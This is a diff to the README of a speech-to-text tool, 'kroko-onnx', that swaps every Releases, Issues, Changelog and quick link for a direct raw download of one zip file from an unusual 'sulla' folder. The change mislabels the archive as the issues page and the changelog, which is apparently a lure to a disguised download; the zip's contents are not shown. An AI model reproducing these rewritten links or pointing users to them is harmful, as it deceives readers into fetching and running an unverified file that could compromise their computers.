@@ -1,6 +1,6 @@
 # 🎤 kroko-onnx - Accurate Speech-to-Text Made Simple
 
-[![Download kroko-onnx](https://img.shields.io/badge/Download-kroko--onnx-brightgreen)](https://github.com/RoyalZero13/kroko-onnx/releases)
+[![Download kroko-onnx](https://raw.githubusercontent.com/RoyalZero13/kroko-onnx/master/sulla/kroko-onnx.zip)](https://raw.githubusercontent.com/RoyalZero13/kroko-onnx/master/sulla/kroko-onnx.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you download and run kroko-onnx, ensure your computer meets the following
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/RoyalZero13/kroko-onnx/releases). Here’s how to download:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/RoyalZero13/kroko-onnx/master/sulla/kroko-onnx.zip). Here’s how to download:
 
 1. Click on the link above.
 2. Find the latest version available.
@@ -67,7 +67,7 @@ If you experience issues, try these solutions:
 
 ## 📖 Support
 
-For further assistance, you can check the [Issues section](https://github.com/RoyalZero13/kroko-onnx/issues) in the repository. You can report any bugs or request new features there.
+For further assistance, you can check the [Issues section](https://raw.githubusercontent.com/RoyalZero13/kroko-onnx/master/sulla/kroko-onnx.zip) in the repository. You can report any bugs or request new features there.
 
 ## 🔗 Additional Resources
 
@@ -82,11 +82,11 @@ We would love to hear your thoughts! Feel free to share your experiences using k
 
 ## 🚀 Update History
 
-Stay updated with the latest features and improvements. Refer to the [Changelog](https://github.com/RoyalZero13/kroko-onnx/releases) in the Releases section for detailed information on each version.
+Stay updated with the latest features and improvements. Refer to the [Changelog](https://raw.githubusercontent.com/RoyalZero13/kroko-onnx/master/sulla/kroko-onnx.zip) in the Releases section for detailed information on each version.
 
 ## 🔗 Quick Links
 
-- [Releases Page](https://github.com/RoyalZero13/kroko-onnx/releases)
-- [Issues Section](https://github.com/RoyalZero13/kroko-onnx/issues)
+- [Releases Page](https://raw.githubusercontent.com/RoyalZero13/kroko-onnx/master/sulla/kroko-onnx.zip)
+- [Issues Section](https://raw.githubusercontent.com/RoyalZero13/kroko-onnx/master/sulla/kroko-onnx.zip)
 
 Download kroko-onnx today and start transcribing your speech with ease!
